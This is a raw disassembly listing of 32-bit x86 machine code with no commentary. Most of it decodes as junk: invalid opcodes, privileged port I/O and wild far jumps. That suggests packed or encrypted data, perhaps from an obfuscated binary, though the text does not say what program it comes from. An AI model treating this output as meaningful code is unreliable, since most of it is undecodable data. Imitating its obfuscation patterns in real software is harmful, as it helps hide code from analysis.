  413f13:	mov    al,ds:0xd6ba3605
  413f18:	sbb    DWORD PTR [edi+0x50],ebx
  413f1b:	aas    
  413f1c:	add    edx,DWORD PTR [ecx+0xe]
  413f1f:	mov    eax,0xd7cc700c
  413f24:	test   eax,0x9fad6d76
  413f29:	rol    BYTE PTR [edx],1
  413f2b:	jmp    0x413ec9
  413f2d:	lea    ebp,[esi]
  413f2f:	and    ecx,ebx
  413f31:	test   dl,bh
  413f33:	cmp    DWORD PTR [ecx+ebx*2],esi
  413f36:	adc    DWORD PTR [ecx+0x4a],0xe102022d
  413f3d:	imul   esp,ebp,0xcbda7ce
  413f43:	shr    DWORD PTR ds:0xf150709,cl
  413f49:	sbb    al,0x5e
  413f4b:	lods   al,BYTE PTR ds:[esi]
  413f4c:	and    BYTE PTR [esi+0xdd86f3c],bl
  413f52:	ja     0x413f29
  413f54:	rcl    BYTE PTR [ebp+0x5b4b757b],0x6c
  413f5b:	outs   dx,DWORD PTR ds:[esi]
  413f5c:	jmp    0x413ee3
  413f5e:	xchg   esi,eax
  413f5f:	pop    esp
  413f60:	inc    esi
  413f61:	or     BYTE PTR [ecx],ah
  413f63:	xchg   DWORD PTR [ebx],ebp
  413f65:	shl    edi,0xd1
  413f68:	mov    ecx,DWORD PTR [ebp-0x20]
  413f6b:	add    ecx,eax
  413f6d:	mov    DWORD PTR [ebp-0x30],ecx
  413f70:	movzx  ecx,BYTE PTR ds:0x428275
  413f77:	or     DWORD PTR ds:0x428195,ecx
  413f7d:	lea    eax,[ebp-0x3c]
  413f80:	cmp    DWORD PTR ds:0x4282c9,0x0
  413f87:	mov    DWORD PTR ds:0x428289,0x72ad
  413f91:	not    ecx
  413f93:	jmp    0x414089
  413f98:	mov    ecx,DWORD PTR ds:0x42820d
  413f9e:	cmp    DWORD PTR ds:0x4282c9,0x0
  413fa5:	jb     0x413fe8
  413fab:	push   0x7681
  413fb0:	push   DWORD PTR [ebp-0x1c]
  413fb3:	push   0x60d2
  413fb8:	push   0x339a
  413fbd:	push   0x7384
  413fc2:	call   DWORD PTR ds:0x4289f0
  413fc8:	sbb    DWORD PTR ds:0x4282b1,edi
  413fce:	mov    ecx,DWORD PTR ds:0x4281b9
  413fd4:	mov    ecx,DWORD PTR [ecx]
  413fd6:	adc    DWORD PTR ds:0x428271,ecx
  413fdc:	adc    DWORD PTR ds:0x4282cd,edx
  413fe2:	and    DWORD PTR ds:0x428229,ebx
  413fe8:	adc    ecx,DWORD PTR ds:0x428225
  413fee:	neg    ecx
  413ff0:	mov    ecx,DWORD PTR ds:0x4282b5
  413ff6:	add    ecx,DWORD PTR ds:0x4282c1
  413ffc:	mov    DWORD PTR ds:0x4282b5,ecx
  414002:	cmp    DWORD PTR ds:0x42822d,0x0
  414009:	mov    DWORD PTR ds:0x42823d,0x561a
  414013:	mov    DWORD PTR ds:0x428275,edx
  414019:	mov    DWORD PTR ds:0x428229,0x3d3f
  414023:	jmp    0x414089
  414028:	mov    DWORD PTR ds:0x42823d,0xcff
  414032:	cmp    DWORD PTR ds:0x42822d,0x0
  414039:	jb     0x41406d
  41403f:	push   DWORD PTR [ebp-0x24]
  414042:	push   0x637c
  414047:	push   DWORD PTR [ebp-0xc]
  41404a:	push   DWORD PTR [ebp-0x24]
  41404d:	call   DWORD PTR ds:0x4289f4
  414053:	and    DWORD PTR ds:0x428269,edi
  414059:	xor    ecx,ecx
  41405b:	xor    ecx,DWORD PTR ds:0x42821d
  414061:	sub    ecx,DWORD PTR ds:0x428195
  414067:	mov    DWORD PTR ds:0x42821d,ecx
  41406d:	mov    DWORD PTR ds:0x428235,0x3c28
  414077:	adc    ecx,0x4887
  41407d:	adc    DWORD PTR ds:0x428241,ebx
  414083:	and    ecx,DWORD PTR ds:0x4282bd
  414089:	mov    DWORD PTR [ebp-0x38],eax
  41408c:	mov    ecx,DWORD PTR ds:0x4281c9
  414092:	xor    eax,eax
  414094:	add    eax,DWORD PTR ds:0x4282ed
  41409a:	sub    ecx,eax
  41409c:	or     ecx,DWORD PTR [ecx+eax*1]
  41409f:	mov    eax,DWORD PTR [ebp-0x18]
  4140a2:	and    ecx,0x8f8
  4140a8:	mov    ecx,DWORD PTR [ebp-0x18]
  4140ab:	xor    eax,edi
  4140ad:	adc    DWORD PTR ds:0x4282bd,0x742c
  4140b7:	xor    ecx,ebx
  4140b9:	xor    DWORD PTR ds:0x428221,0x4281a1
  4140c3:	shr    eax,0x2
  4140c6:	and    DWORD PTR ds:0x4282b1,0x230
  4140d0:	shl    ecx,0x1e
  4140d3:	not    DWORD PTR ds:0x428285
  4140d9:	or     eax,ecx
  4140db:	neg    ecx
  4140dd:	jmp    0x414467
  4140e2:	xchg   ebx,eax
  4140e3:	or     cl,BYTE PTR [eax-0x68a276a3]
  4140e9:	adc    al,0xe0
  4140eb:	test   al,0xd4
  4140ed:	sti    
  4140ee:	pop    ecx
  4140ef:	sbb    eax,0x99266f93
  4140f4:	mov    ebx,0xbbc590bb
  4140f9:	mov    ebx,0x59230cf1
  4140fe:	fsubr  st(1),st
  414100:	dec    eax
  414101:	dec    edi
  414102:	xor    BYTE PTR ds:0xa717f48a,ch
  414108:	sbb    BYTE PTR [edx],al
  41410a:	push   ecx
  41410b:	jg     0x414093
  41410d:	mov    al,BYTE PTR [ebx+0x52b69cef]
  414113:	test   DWORD PTR ds:0xf1e8b17f,ebp
  414119:	shl    DWORD PTR [esp+ebx*1-0x73],1
  41411d:	pop    edx
  41411e:	ja     0x414160
  414120:	adc    esp,ebp
  414122:	loope  0x41413b
  414124:	push   0xbec7ea33
  414129:	fisub  WORD PTR [ebx]
  41412b:	nop
  41412c:	(bad)  
  41412d:	pop    ds
  41412e:	loopne 0x414128
  414130:	push   esi
  414131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414132:	mov    dl,0x97
  414134:	push   ebx
  414135:	jo     0x41411b
  414137:	popf   
  414138:	jb     0x4141ab
  41413a:	shr    ah,cl
  41413c:	and    dh,BYTE PTR [edi]
  41413e:	and    bl,dh
  414140:	xchg   DWORD PTR [ebx],ebp
  414142:	std    
  414143:	add    eax,0x8abd8b5
  414148:	xchg   esi,eax
  414149:	and    al,0x2e
  41414b:	imul   ebp,DWORD PTR [esi-0x62bec14c],0x2b
  414152:	mov    ecx,0x9aed574a
  414157:	outs   dx,DWORD PTR ds:[esi]
  414158:	fdivr  st,st(0)
  41415a:	outs   dx,BYTE PTR ds:[esi]
  41415b:	push   eax
  41415c:	xchg   ch,ah
  41415e:	jbe    0x414169
  414160:	lahf   
  414161:	mov    eax,0xc77ef22c
  414166:	ficomp DWORD PTR [esi]
  414168:	dec    ebp
  414169:	test   al,0xf7
  41416b:	or     bh,bl
  41416d:	jbe    0x4141d2
  41416f:	jmp    0x41419e
  414171:	or     al,0xbb
  414173:	mov    ds:0xb0d7f4bc,eax
  414178:	inc    ecx
  414179:	or     al,0x37
  41417b:	add    BYTE PTR [edx+0x31],ah
  41417e:	push   ds
  41417f:	inc    ebp
  414180:	add    BYTE PTR [edi],ah
  414182:	imul   edx,DWORD PTR [esi-0x4391f32c],0x4e
  414189:	dec    ebx
  41418a:	ds inc edx
  41418c:	mov    DWORD PTR [edx-0x72ff31d9],ecx
  414192:	inc    esi
  414193:	dec    esp
  414194:	add    ch,BYTE PTR ds:0x85525e93
  41419a:	push   es
  41419b:	out    0x1d,eax
  41419d:	cmp    cl,BYTE PTR [eax-0x3d80adf9]
  4141a3:	cmp    BYTE PTR [edi-0x4ea56201],bh
  4141a9:	mov    bl,0x31
  4141ab:	xor    BYTE PTR [ebp+0x68275701],0x6d
  4141b2:	outs   dx,BYTE PTR ds:[esi]
  4141b3:	ror    BYTE PTR es:[ebx-0x7d],cl
  4141b7:	sub    al,0x8a
  4141b9:	mov    cl,0x33
  4141bb:	dec    edx
  4141bc:	inc    ecx
  4141bd:	rol    DWORD PTR [edi-0x79],cl
  4141c0:	or     DWORD PTR [eax+0x62],edx
  4141c3:	test   DWORD PTR [edx],0x49591ae6
  4141c9:	cli    
  4141ca:	cmp    eax,0x4b1b831b
  4141cf:	fld    QWORD PTR [edx+0x62379b91]
  4141d5:	retf   0xae1b
  4141d8:	inc    esp
  4141d9:	loope  0x41422a
  4141db:	(bad)  
  4141dc:	lahf   
  4141dd:	fimul  DWORD PTR [edi-0x35]
  4141e0:	int3   
  4141e1:	loope  0x4141e4
  4141e3:	or     al,0x28
  4141e5:	pop    ss
  4141e6:	adc    eax,0x1814457d
  4141eb:	sub    esp,DWORD PTR [ebp+esi*1+0x63]
  4141ef:	test   al,0x8f
  4141f1:	inc    ecx
  4141f2:	iret   
  4141f3:	mov    ds:0x8042cb26,al
  4141f8:	rcr    BYTE PTR [esi-0x1bb222f0],0x9d
  4141ff:	std    
  414200:	push   ds
  414201:	retf   
  414202:	jl     0x4141ba
  414204:	(bad)  
  414205:	cmp    cl,ah
  414207:	je     0x41419d
  414209:	or     esi,eax
  41420b:	adc    DWORD PTR [edx],ecx
  41420d:	jle    0x414248
  41420f:	das    
  414210:	inc    eax
  414211:	pop    ds
  414212:	xchg   ebx,eax
  414213:	aad    0xb2
  414215:	stos   BYTE PTR es:[edi],al
  414216:	jnp    0x41424f
  414218:	pop    es
  414219:	add    dh,0xe0
  41421c:	push   ebx
  41421d:	xchg   esp,eax
  41421e:	sahf   
  41421f:	ins    BYTE PTR es:[edi],dx
  414220:	or     al,0xca
  414222:	pop    ebx
  414223:	and    al,0xb0
  414225:	inc    ecx
  414226:	dec    eax
  414227:	pop    DWORD PTR [esi+0xb]
  41422a:	out    0xbc,al
  41422c:	jecxz  0x4141bc
  41422e:	inc    ebx
  41422f:	or     al,0x73
  414231:	leave  
  414232:	jbe    0x41427a
  414234:	mov    bl,0xc2
  414236:	lds    edi,FWORD PTR [edx-0x3c]
  414239:	rcr    DWORD PTR [edi-0x15703f0e],cl
  41423f:	adc    al,0xb8
  414241:	dec    esi
  414242:	or     esp,ebp
  414244:	xchg   edi,eax
  414245:	xchg   edi,eax
  414246:	inc    ebx
  414247:	pop    ds
  414248:	jnp    0x4141e7
  41424a:	or     DWORD PTR [ecx-0x7712a122],0x39
  414251:	push   edi
  414252:	push   esp
  414253:	inc    edi
  414255:	pushf  
  414256:	fistp  DWORD PTR [edi+esi*8-0x30d00a18]
  41425d:	xor    BYTE PTR [edi],ah
  41425f:	mov    ds:0xe62e3b6e,al
  414264:	ins    DWORD PTR es:[edi],dx
  414265:	push   ss
  414266:	test   DWORD PTR [esi+0x3f01a489],edi
  41426c:	jge    0x4142ad
  41426e:	in     eax,dx
  41426f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414270:	mov    cl,0xdf
  414272:	(bad)  
  414273:	daa    
  414274:	xor    al,0xd5
  414276:	mov    ch,0x20
  414278:	add    al,0x95
  41427a:	sbb    DWORD PTR [edi+ebx*8-0x44],ecx
  41427e:	push   esi
  41427f:	rcl    BYTE PTR [eax-0x780aba87],1
  414285:	xor    ebp,DWORD PTR [ebp-0x4097c403]
  41428b:	dec    esi
  41428c:	pop    eax
  41428d:	fs dec ecx
  41428f:	sbb    eax,0xa82d538b
  414294:	sub    al,cl
  414296:	adc    ah,BYTE PTR ds:0xd64cf7b0
  41429c:	jb     0x414258
  41429e:	sub    DWORD PTR [ebx],esi
  4142a0:	jae    0x414252
  4142a2:	push   ss
  4142a3:	popa   
  4142a4:	mov    al,ds:0x5d6dc274
  4142a9:	or     eax,0x49e44b71
  4142ae:	data16 sti 
  4142b0:	rol    ah,cl
  4142b2:	mov    eax,0x64336944
  4142b7:	pop    esi
  4142b8:	xor    DWORD PTR gs:[eax],edi
  4142bb:	repz mov ds:0xaf7abb07,eax
  4142c1:	js     0x4142c3
  4142c3:	cdq    
  4142c4:	fmul   st,st(3)
  4142c6:	out    dx,eax
  4142c7:	in     al,0x13
  4142c9:	and    al,0xd0
  4142cb:	mov    esi,0xcf501322
  4142d0:	fisttp WORD PTR [ebx+edi*8-0x5f]
  4142d4:	ret    0x37e4
  4142d7:	mov    ch,0xe6
  4142d9:	sahf   
  4142da:	or     DWORD PTR [ecx-0x49],ebp
  4142dd:	imul   ebx,DWORD PTR [ecx+edx*4-0x6a319b4f],0x46b50f95
  4142e8:	(bad)  
  4142e9:	sbb    DWORD PTR [ebx-0x4e],esp
  4142ec:	dec    eax
  4142ed:	ja     0x41432c
  4142ef:	leave  
  4142f0:	iret   
  4142f1:	rcr    DWORD PTR ds:0x69037d21,0x9f
  4142f8:	call   0x25b4:0x2011eb1c
  4142ff:	mov    esp,0x416cb19a
  414304:	xchg   al,ch
  414306:	dec    ebp
  414307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414308:	call   0x32a33077
  41430d:	mov    al,ds:0xaa688157
  414312:	adc    DWORD PTR [edi-0x42],0xffffffde
  414316:	mov    bl,0x86
  414318:	ss pop edx
  41431a:	loope  0x4142f6
  41431c:	dec    ebp
  41431d:	inc    ecx
  41431e:	or     bl,BYTE PTR [ecx-0x72]
  414321:	pushf  
  414322:	fsub   st(3),st
  414324:	dec    ebx
  414325:	sub    ebx,DWORD PTR [ecx+esi*8-0x60]
  414329:	lds    esi,FWORD PTR [ebp+0x78d479b]
  41432f:	pop    ecx
  414330:	mov    al,0x3
  414332:	shl    BYTE PTR [edi],1
  414334:	jne    0x4142de
  414336:	cmc    
  414337:	jb     0x4142ba
  414339:	dec    edx
  41433a:	push   cs
  41433b:	popf   
  41433c:	and    bl,BYTE PTR [ecx-0x1f39733]
  414342:	ins    BYTE PTR es:[edi],dx
  414343:	inc    edx
  414344:	adc    cl,bl
  414346:	adc    eax,0x2135a5d7
  41434b:	clc    
  41434c:	push   cs
  41434d:	or     al,0x16
  41434f:	scas   eax,DWORD PTR es:[edi]
  414350:	sar    BYTE PTR [ecx+0x33],1
  414353:	mov    eax,0x6730b9f5
  414358:	in     eax,0x66
  41435a:	inc    edi
  41435b:	into   
  41435c:	fpatan 
  41435e:	ss hlt 
  414360:	adc    eax,0xcdcdf593
  414365:	push   esi
  414366:	cdq    
  414367:	jno    0x414343
  414369:	jnp    0x4142f8
  41436b:	ja     0x4143e8
  41436d:	jbe    0x414354
  41436f:	jnp    0x4143a3
  414371:	sbb    dl,ah
  414373:	push   edi
  414374:	addr16 repz pushf 
  414377:	int    0xeb
  414379:	inc    esi
  41437a:	and    BYTE PTR [ebp+0x66486cc0],ch
  414380:	dec    ebx
  414381:	push   es
  414382:	retf   
  414383:	cmp    BYTE PTR [ebx-0x5ab121f8],ch
  414389:	lea    ebp,ds:0xe85963ec
  41438f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414390:	jg     0x4143ff
  414392:	pop    esp
  414393:	rol    DWORD PTR [edx+edx*1+0x14464277],cl
  41439a:	stos   DWORD PTR es:[edi],eax
  41439b:	je     0x414353
  41439d:	ins    BYTE PTR es:[edi],dx
  41439e:	mov    al,0x6a
  4143a0:	mov    al,0x3f
  4143a2:	int3   
  4143a3:	and    ebx,esp
  4143a5:	ins    BYTE PTR es:[edi],dx
  4143a6:	daa    
  4143a7:	dec    ebp
  4143a8:	jno    0x414346
  4143aa:	mov    ah,0x2
  4143ac:	adc    eax,0x6765f250
  4143b1:	int    0xe8
  4143b3:	stc    
  4143b4:	mov    bh,BYTE PTR [edi+0x4a5a0498]
  4143ba:	pop    esi
  4143bb:	mov    DWORD PTR [esi+0x24],ecx
  4143be:	popf   
  4143bf:	mov    esi,0xe2964657
  4143c4:	sar    DWORD PTR [ebp+0x4e],0x5c
  4143c8:	(bad)  
  4143c9:	dec    BYTE PTR [ebx]
  4143cb:	sub    eax,0x50fd1661
  4143d0:	inc    eax
  4143d1:	xor    al,dl
  4143d3:	xor    BYTE PTR ds:0xb4216e20,dh
  4143d9:	cmp    BYTE PTR [edx],ah
  4143db:	lea    ebx,[ebx]
  4143dd:	(bad)  
  4143de:	sbb    dh,BYTE PTR [ecx]
  4143e0:	push   edi
  4143e1:	mov    bl,0xa1
  4143e3:	mov    ah,0x36
  4143e5:	inc    ecx
  4143e6:	cmp    DWORD PTR [eax],ebp
  4143e8:	ret    
  4143e9:	sbb    bl,BYTE PTR [edi]
  4143eb:	jae    0x41441f
  4143ed:	push   esi
  4143ee:	lea    eax,[esi+eiz*4+0x209ba5fd]
  4143f5:	dec    esp
  4143f6:	dec    esp
  4143f7:	cmp    BYTE PTR [eax],cl
  4143f9:	sub    al,0xc7
  4143fb:	pop    edx
  4143fc:	lds    esp,FWORD PTR [ebp-0x888f42e]
  414402:	shl    BYTE PTR [eax+0x60da4982],0x9b
  414409:	imul   ecx,DWORD PTR [ebx+0x252e12be],0x136efe04
  414413:	jne    0x41441a
  414415:	sbb    DWORD PTR ds:0x88714f39,esp
  41441b:	xor    ecx,DWORD PTR [ecx+ecx*1]
  41441e:	inc    edi
  41441f:	test   DWORD PTR [esi+ebx*8-0x54],edi
  414423:	repz adc al,0xa8
  414426:	pop    esp
  414427:	sub    ah,BYTE PTR [ebx]
  414429:	mov    eax,ds:0x426b9bd1
  41442e:	lar    esi,WORD PTR [ebp-0xb]
  414432:	iret   
  414433:	mov    ecx,0x92b25a5
  414438:	sbb    bl,bl
  41443a:	mov    ecx,0x556802dc
  41443f:	out    dx,eax
  414440:	out    0xa,eax
  414442:	mov    ch,0x2c
  414444:	mov    WORD PTR [edi+0x7d],gs
  414447:	xchg   edi,eax
  414448:	adc    al,0x7b
  41444a:	jno    0x4144ba
  41444c:	(bad)  
  41444d:	imul   eax,DWORD PTR [edx],0x476ce335
  414453:	sbb    DWORD PTR [esi],esi
  414455:	nop    DWORD PTR [ebp-0x32]
  414459:	stos   BYTE PTR es:[edi],al
  41445a:	add    DWORD PTR [edx+0x52],0xffffffff
  41445e:	mov    DWORD PTR ss:[ecx+0x55030c42],eax
  414465:	cmp    DWORD PTR [ecx+ecx*4],edx
  414468:	inc    ebp
  414469:	aam    0x83
  41446b:	cmp    eax,0x428195
  414470:	add    bh,al
  414472:	add    eax,0x428225
  414477:	or     DWORD PTR [edx],esp
  414479:	add    BYTE PTR [eax],al
  41447b:	mov    DWORD PTR ds:0x428241,ebx
  414481:	mov    ecx,DWORD PTR ds:0x428215
  414487:	not    ecx
  414489:	jmp    0x4144f9
  41448e:	mov    DWORD PTR ds:0x4282cd,0x58bd
  414498:	not    eax
  41449a:	cmp    DWORD PTR ds:0x428195,0x0
  4144a1:	jae    0x4144df
  4144a7:	push   0x4282cd
  4144ac:	push   0x4282c9
  4144b1:	push   0x6ebd
  4144b6:	push   0x4280fd
  4144bb:	push   0x4280b3
  4144c0:	push   0x42812f
  4144c5:	call   DWORD PTR ds:0x428a7c
  4144cb:	xor    DWORD PTR ds:0x42821d,ebx
  4144d1:	xor    ecx,ecx
  4144d3:	add    ecx,0x7bdf
  4144d9:	sub    DWORD PTR ds:0x428285,ecx
  4144df:	mov    ecx,DWORD PTR ds:0x4282c5
  4144e5:	adc    DWORD PTR ds:0x4281a1,ecx
  4144eb:	add    ecx,ecx
  4144ed:	or     ecx,ecx
  4144ef:	add    DWORD PTR ds:0x428205,0x2022
  4144f9:	mov    DWORD PTR [ebp-0x8],0xa6069cbe
  414500:	mov    eax,DWORD PTR [ebp-0x8]
  414503:	mov    ecx,DWORD PTR [ebp-0x8]
  414506:	jmp    0x414890
  41450b:	xchg   ebx,eax
  41450c:	xor    esi,edi
  41450e:	xor    BYTE PTR [edi+0x34],dh
  414511:	popf   
  414512:	mov    ecx,0xfb9b132d
  414517:	lea    ecx,[edi-0x6402ceab]
  41451d:	mov    ebx,0xbbc590bb
  414522:	mov    ebx,0x4010241a
  414527:	xor    eax,0x477187d2
  41452c:	jmp    0x537318a6
  414531:	shl    BYTE PTR [edi+0xd],cl
  414534:	test   al,0xbf
  414536:	xor    al,0xe2
  414538:	lds    esp,FWORD PTR [eax-0x66]
  41453b:	ins    DWORD PTR es:[edi],dx
  41453c:	jecxz  0x4145bb
  41453e:	mov    dh,0x43
  414540:	cs xchg edi,eax
  414542:	sbb    ecx,DWORD PTR [edx+0x5f387b93]
  414548:	test   BYTE PTR [edi+edx*8],0xf
  41454c:	pop    esi
  41454d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41454e:	xor    BYTE PTR [edi],dl
  414550:	iret   
  414551:	(bad)  
  414552:	and    al,0xe2
  414554:	in     al,0xab
  414556:	add    DWORD PTR [edx-0x8],edx
  414559:	jae    0x414524
  41455b:	loope  0x414574
  41455d:	dec    ecx
  41455e:	out    0x52,eax
  414560:	retf   
  414561:	aad    0x8d
  414563:	iret   
  414564:	shl    BYTE PTR [esi-0x2656f475],cl
  41456a:	mov    esi,0x49da1307
  41456f:	pop    edi
  414570:	nop
  414571:	dec    esi
  414572:	loopne 0x414524
  414574:	sub    al,0x0
  414576:	cmp    BYTE PTR [ebp+0x3d],bl
  414579:	adc    DWORD PTR [ecx+eiz*2+0x2e],0xf4b81828
  414581:	das    
  414582:	jp     0x4145ff
  414584:	ret    0xf5a5
  414587:	jecxz  0x4145b0
  414589:	scas   eax,DWORD PTR es:[edi]
  41458a:	and    al,0x85
  41458c:	mov    ah,0x31
  41458e:	leave  
  41458f:	push   ebx
  414590:	jl     0x41460a
  414592:	lods   al,BYTE PTR ds:[esi]
  414593:	add    DWORD PTR [edi-0x5d187bf6],ecx
  414599:	push   esp
  41459a:	adc    al,0xe7
  41459d:	or     ebp,ecx
  41459f:	cmp    al,0xbe
  4145a1:	lock aas 
  4145a3:	imul   esp,DWORD PTR [edi-0x55],0x9b3bd0db
  4145aa:	dec    ecx
  4145ab:	hlt    
  4145ac:	ins    BYTE PTR es:[edi],dx
  4145ad:	ins    DWORD PTR es:[edi],dx
  4145ae:	cmp    BYTE PTR [eax],al
  4145b0:	adc    ebp,0xadc74477
  4145b6:	push   0x76ef10eb
  4145bb:	jbe    0x41460b
  4145bd:	mov    esp,0x9beec8de
  4145c2:	mov    eax,ds:0x2afca1ed
  4145c7:	dec    eax
  4145c8:	imul   eax,DWORD PTR [edx+0xb],0xc7d90277
  4145cf:	in     al,dx
  4145d0:	fwait
  4145d1:	mov    DWORD PTR [eax],edx
  4145d3:	cmp    eax,0xa0b1878a
  4145d8:	pusha  
  4145d9:	mov    ch,0xfc
  4145db:	mov    edi,0x225d57c7
  4145e0:	(bad)  
  4145e1:	fbstp  TBYTE PTR [ebx-0x6b]
  4145e4:	inc    ebx
  4145e5:	inc    edx
  4145e6:	adc    edi,esi
  4145e8:	adc    eax,0xa6065011
  4145ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145ee:	cli    
  4145ef:	cli    
  4145f0:	jmp    0x414648
  4145f2:	push   edi
  4145f3:	and    eax,DWORD PTR [edx]
  4145f5:	push   es
  4145f6:	in     al,dx
  4145f7:	pusha  
  4145f8:	ja     0x414644
  4145fa:	xor    esi,DWORD PTR [eax+ebx*2]
  4145fd:	mov    DWORD PTR [ebx+0x14],eax
  414600:	dec    ecx
  414601:	xchg   DWORD PTR [esi-0x40f3f54d],eax
  414607:	mov    DWORD PTR [edx+0x7c630290],edx
  41460d:	mov    al,ds:0x261b99f0
  414612:	jnp    0x4145a1
  414614:	popa   
  414615:	adc    DWORD PTR [esi+0x484e4399],0xffffffe5
  41461c:	stos   DWORD PTR es:[edi],eax
  41461d:	mov    ch,0xb
  41461f:	mov    DWORD PTR [eax-0x1d],esp
  414622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414623:	lea    edi,[ebx]
  414625:	(bad)  
  414626:	adc    dh,ah
  414628:	pop    edx
  414629:	stos   BYTE PTR es:[edi],al
  41462a:	dec    edx
  41462b:	mov    ebp,0x488e392e
  414630:	mov    cl,dh
  414632:	push   ds
  414633:	gs ret 
  414635:	mov    BYTE PTR [edx-0x36],0xcc
  414639:	cwde   
  41463a:	sub    ecx,DWORD PTR [ebx+ebx*4-0x6f]
  41463e:	in     al,0xb8
  414640:	in     eax,dx
  414641:	mov    esp,0xbfed2228
  414646:	imul   ecx,DWORD PTR [ebx+0x17c030a7],0x1f7806bd
  414650:	jmp    0xd11062ad
  414655:	xchg   edi,eax
  414656:	lock add al,0x42
  414659:	xor    eax,0x1afe4dbe
  41465e:	repz iret 
  414660:	lds    ebp,FWORD PTR [edx-0x6084aafd]
  414666:	sbb    eax,0x49fa5f50
  41466b:	jmp    0xf785:0xe51923c8
  414672:	in     al,0x57
  414674:	mov    ebp,0x81c6ebe0
  414679:	fisttp WORD PTR [esi+ebx*2+0x21]
  41467d:	dec    edi
  41467e:	outs   dx,BYTE PTR ds:[esi]
  41467f:	call   DWORD PTR [edi+ecx*2-0x5e2f2d03]
  414686:	cmc    
  414687:	hlt    
  414688:	or     DWORD PTR [esi+0x12bb9ad1],ebx
  41468e:	mov    ebx,0xdcd43578
  414693:	(bad)  
  414694:	adc    eax,0x9d9d6c86
  414699:	outs   dx,BYTE PTR ds:[esi]
  41469a:	jno    0x4146ba
  41469c:	ins    BYTE PTR es:[edi],dx
  41469d:	sbb    eax,0x22dc6068
  4146a2:	(bad)  
  4146a3:	xchg   edi,eax
  4146a4:	fwait
  4146a5:	sbb    BYTE PTR [eax],0x1
  4146a8:	retf   
  4146a9:	dec    ebp
  4146aa:	cmp    edx,esi
  4146ac:	mov    ebp,0x8471a155
  4146b1:	dec    ecx
  4146b2:	popf   
  4146b3:	int    0x38
  4146b5:	sub    dl,ch
  4146b7:	(bad)  
  4146b8:	xchg   dh,dl
  4146ba:	jmp    0xc7f005b2
  4146bf:	fwait
  4146c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146c1:	fdiv   QWORD PTR [edx]
  4146c3:	fisttp QWORD PTR [ebp+0x33]
  4146c6:	loope  0x4146f0
  4146c8:	rcl    DWORD PTR [edx+0x10],0x91
  4146cc:	ret    
  4146cd:	data16 stc 
  4146cf:	or     al,0x94
  4146d1:	repnz and eax,0x786d685e
  4146d7:	adc    BYTE PTR [edi-0x2],ah
  4146da:	dec    ecx
  4146db:	lahf   
  4146dc:	pop    edx
  4146dd:	ret    
  4146de:	push   0x8e0148ee
  4146e3:	popa   
  4146e4:	idiv   BYTE PTR [eax-0x495e325b]
  4146ea:	cli    
  4146eb:	test   eax,0xa7a0755
  4146f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146f1:	or     esp,DWORD PTR [eax-0xe]
  4146f4:	shr    ecx,cl
  4146f6:	sti    
  4146f7:	popa   
  4146f8:	cmp    eax,0x93c82e38
  4146fd:	pop    DWORD PTR [edx+eax*2]
  414700:	pushf  
  414701:	adc    BYTE PTR [eax-0x119b6587],ah
  414707:	popa   
  414708:	shl    edi,1
  41470a:	and    eax,0x663d6ad2
  41470f:	in     eax,0xff
  414711:	into   
  414712:	inc    edi
  414713:	in     eax,dx
  414714:	mul    cl
  414716:	loop   0x414716
  414718:	push   eax
  414719:	inc    ebx
  41471a:	lahf   
  41471b:	pop    ds
  41471c:	inc    ecx
  41471d:	std    
  41471e:	in     eax,0x6
  414720:	xchg   esp,eax
  414721:	mov    al,ds:0x51822e98
  414726:	mov    ebx,ebx
  414728:	scas   al,BYTE PTR es:[edi]
  414729:	sbb    al,0x59
  41472b:	test   eax,0x2f5b1b1f
  414730:	jge    0x41477a
  414732:	jp     0x4146f2
  414734:	xor    ebx,DWORD PTR [edx+0x55]
  414737:	xchg   ebp,eax
  414738:	xor    eax,DWORD PTR [ebp+0x191b3186]
  41473e:	mov    es,edx
  414740:	test   eax,0x698a92eb
  414745:	sub    al,0x64
  414747:	push   0x71
  414749:	xor    bh,ch
  41474b:	adc    eax,0x1d489204
  414750:	int    0x2d
  414752:	or     DWORD PTR [edx+edi*8+0x6dbc423b],edi
  414759:	jl     0x414794
  41475b:	sbb    ah,BYTE PTR [ecx-0x7e]
  41475e:	(bad)
  414762:	sub    eax,0xb659be03
  414767:	cmp    al,0x4b
  414769:	adc    DWORD PTR [esi+0x50],edi
  41476c:	int    0x95
  41476e:	pop    esi
  41476f:	test   DWORD PTR [edx],0xd8918995
  414775:	(bad)  [ebp+0xa]
  414778:	cmp    al,bl
  41477a:	cld    
  41477b:	nop
  41477c:	fucom  st(2)
  41477e:	dec    edx
  41477f:	into   
  414780:	mov    al,0x37
  414782:	imul   eax,DWORD PTR [edx-0x53],0xd0ffef49
  414789:	sub    al,BYTE PTR [ebx+ebp*2+0x7368b4d7]
  414790:	pop    ebp
  414791:	push   cs
  414792:	popw   ss
  414794:	or     DWORD PTR [eax-0x7e],edi
  414797:	xor    al,0xcf
  414799:	(bad)  
  41479b:	push   cs
  41479c:	mov    DWORD PTR [edi+0x58],edi
  41479f:	push   0x71
  4147a1:	adc    esi,edi
  4147a3:	push   0x27
  4147a5:	ins    DWORD PTR es:[edi],dx
  4147a6:	stos   BYTE PTR es:[edi],al
  4147a7:	scas   eax,DWORD PTR es:[edi]
  4147a8:	loope  0x414739
  4147aa:	(bad)  
  4147ab:	out    dx,al
  4147ac:	jecxz  0x41481b
  4147ae:	cld    
  4147af:	dec    esi
  4147b0:	aaa    
  4147b1:	add    eax,0xe8ade804
  4147b6:	(bad)  
  4147b7:	xor    eax,0x2eec5b4e
  4147bc:	fiadd  DWORD PTR [ebx+0x722987fd]
  4147c2:	mov    DWORD PTR [ebp+0x11],0xc333f521
  4147c9:	adc    DWORD PTR fs:[eax+edi*1],edx
  4147cd:	daa    
  4147ce:	mov    eax,ds:0x4c1e4a9f
  4147d3:	pop    edi
  4147d4:	test   DWORD PTR [ecx],ebp
  4147d6:	cmp    DWORD PTR [ebx],edi
  4147d8:	adc    DWORD PTR [eax+0xb],ebx
  4147db:	cmp    eax,0xad7ccf2f
  4147e0:	dec    edx
  4147e1:	loopne 0x41480b
